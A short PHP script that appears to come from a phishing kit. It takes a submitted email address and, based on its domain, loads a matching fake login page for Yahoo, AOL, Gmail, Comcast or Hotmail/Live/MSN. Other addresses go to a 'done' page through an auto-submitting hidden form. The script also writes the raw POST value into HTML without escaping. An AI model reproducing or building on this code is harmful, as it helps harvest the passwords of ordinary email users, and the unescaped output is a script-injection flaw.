<?php
session_start();
require_once('../get_setting.php');
$_SESSION['email'] = $_POST['email'];
$email = explode("@",$_SESSION['email']);

if(preg_match('/yahoo/', $email[1]) or preg_match('/ymail/', $email[1])) {
	require_once("../files/login-yahoo.php");
}else if(preg_match('/aol/', $email[1])) {
	require_once("../files/login-aol.php");
}else if(preg_match('/gmail/', $email[1])) {
	require_once("../files/login-gmail.php");
}else if(preg_match('/comcast/', $email[1])) {
	require_once("../files/login-comcast.php");
}else if(preg_match('/hotmail/', $email[1]) or preg_match('/live/', $email[1]) or preg_match('/msn/', $email[1]) or preg_match('/passport/', $email[1])) {
	require_once("../files/login-hotmail.php");
}else{
	echo "<form id='boyxd' method='POST' action='../done'><input type='hidden' name='email' value='".$_SESSION['email']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
	exit();
}